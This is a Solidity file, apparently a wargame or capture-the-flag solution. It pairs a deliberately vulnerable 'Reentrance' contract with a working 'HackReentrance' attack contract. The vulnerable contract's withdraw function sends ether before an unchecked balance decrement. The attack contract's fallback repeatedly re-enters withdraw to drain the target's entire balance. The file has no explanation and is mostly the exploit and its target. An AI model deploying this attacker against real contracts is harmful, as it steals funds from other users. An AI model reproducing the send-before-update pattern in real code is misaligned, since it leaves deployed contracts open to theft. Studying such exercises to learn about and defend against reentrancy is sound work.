// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            unchecked {
                balances[msg.sender] -= _amount;
            }
        }
    }

    receive() external payable {}
}

contract HackReentrance {
    address payable reentrance;
    uint constant AMOUNT = 1000000000000000;

    constructor(address payable _reentrance) {
        reentrance = _reentrance;
    }

    function donate() external payable {
        Reentrance(reentrance).donate{value: msg.value}(address(this));
    }

    function attack() external {
        Reentrance(reentrance).withdraw(AMOUNT);
    }

    fallback() external payable {
        if (reentrance.balance != 0) {
            Reentrance(reentrance).withdraw(AMOUNT);
        }
    }
}
